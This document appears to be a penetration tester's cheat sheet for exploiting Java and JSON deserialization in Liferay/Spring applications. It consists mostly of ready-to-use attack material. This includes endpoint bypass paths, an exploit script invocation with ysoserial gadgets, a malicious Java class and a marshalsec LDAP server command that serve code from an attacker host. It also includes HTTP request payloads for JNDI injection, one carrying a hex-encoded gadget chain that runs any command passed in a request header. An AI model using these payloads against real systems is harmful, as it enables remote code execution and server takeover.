### Java Deserialze

- Check /api/liferay, /api/spring
- bypass: /api///liferay, /api////spring, /#/../api/liferay...
- Exploit: use exploit_life.py

```powershell
python exploit_life.py -u http://example.com/ -y ysoserial.jar -p CommonsCollections1 -c whoami`
```
```powershell
optional arguments:
  -h, --help            show this help message and exit
  -u URL, --url URL     Url vulnerability (Example: http://example.com/)
  -y YSOSERIAL, --ysoserial YSOSERIAL
                        Path to ysoserial.jar
  -p PAYLOAD, --payload PAYLOAD
                        Payload in ysoserial (Example: CommonsCollections1)
  -c CMD, --cmd CMD     Command to execute
```

### JSON Deserializer
- Create `Exploit.java` with content
```powershell
import java.io.IOException;

public class Exploit {
    public Exploit(){
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```
- build codebase: `javac Exploit.java` and put in http server (example: http://10.0.0.1)
- create LDAP|RMIServer use [marshalsec](https://github.com/mbechler/marshalsec) with < Java 8u191 else see more [here](https://www.veracode.com/blog/research/exploiting-jndi-injections-java)

```powershell
java -cp .\marshalsec-all.jar marshalsec.jndi.LDAPRefServer http://10.0.0.1/#Exploit 8080
```

- Authen
```powershell
POST /poller/receive HTTP/1.1
Host: localhost:8080
Connection: close
Cookie: ########

pollerRequest=[$OPEN_CURLY_BRACE$]"javaClass":"org.hibernate.jmx.StatisticsService","sessionFactoryJNDIName":"ldap://10.0.0.1:8080/Exploit"[$CLOSE_CURLY_BRACE$]
```
- Unauthen
```powershell
POST /api/jsonws/invoke HTTP/1.1
Host: localhost:8080
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 187

cmd={"/expandocolumn/add-column":{"tableId":1,"name":"table_name","type":1,"defaultData:org.hibernate.jmx.StatisticsService":"{\"sessionFactoryJNDIName\":\"ldap://10.0.0.1:8080/Exploit\"}"}}
```

```powershell
POST /api/jsonws/invoke HTTP/1.1
Host: localhost:8080
x-cmd: notepad
Content-Type: application/x-www-form-urlencoded
Content-Length: 4242

cmd={"/expandocolumn/add-column":{"tableId":1,"name":"table_name","type":1,"defaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource":"{\"userOverridesAsString\":\"HexAsciiSerializedMap:aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000047372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200206a617661782e7363726970742e536372697074456e67696e654d616e61676572000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b78707074000b6e6577496e7374616e6365707371007e0013757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000174000a6a61766173637269707474000f676574456e67696e6542794e616d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a99020000787000000001767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174037820202020202020207661722073657276696365436f6e74657874203d206e756c6c3b0a20202020202020207472797b0a20202020202020202020202073657276696365436f6e74657874203d20636f6d2e6c6966657261792e706f7274616c2e6b65726e656c2e736572766963652e53657276696365436f6e746578745468726561644c6f63616c2e67657453657276696365436f6e7465787428293b0a20202020202020207d20636174636820286529207b0a20202020202020202020202073657276696365436f6e74657874203d20636f6d2e6c6966657261792e706f7274616c2e736572766963652e53657276696365436f6e746578745468726561644c6f63616c2e67657453657276696365436f6e7465787428293b0a20202020202020207d20202020202020207661722072657175657374203d2073657276696365436f6e746578742e6765745265717565737428293b0a202020202020202076617220636d64203d20726571756573742e6765744865616465722822782d636d6422293b0a20202020202020207661722070726f63657373203d206a6176612e6c616e672e52756e74696d652e67657452756e74696d6528292e6578656328636d64293b0a202020202020202076617220726573706f6e7365203d2073657276696365436f6e746578742e676574526573706f6e736528293b0a2020202020202020696628726573706f6e736520213d206e756c6c297b0a202020202020202020202020766172206f7574203d20726573706f6e73652e6765744f757470757453747265616d28293b0a20202020202020202020202076617220646973203d206e6577206a6176612e696f2e44617461496e70757453747265616d2870726f636573732e676574496e70757453747265616d2829293b0a2020202020202020202020207661722064697372203d206469732e726561644c696e6528293b0a2020202020202020202020207768696c652028206469737220213d206e756c6c2029207b0a202020202020202020202020202020206f75742e7072696e746c6e2864697372293b2020202020202020202020202020202064697372203d206469732e726561644c696e6528293b0a2020202020202020202020207d20202020202020207d20656c7365207b206a6176612e6c616e672e52756e74696d652e67657452756e74696d6528292e65786563282763616c6327293b207d7400046576616c7571007e001e0000000171007e0021737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878;\"}"}}

```
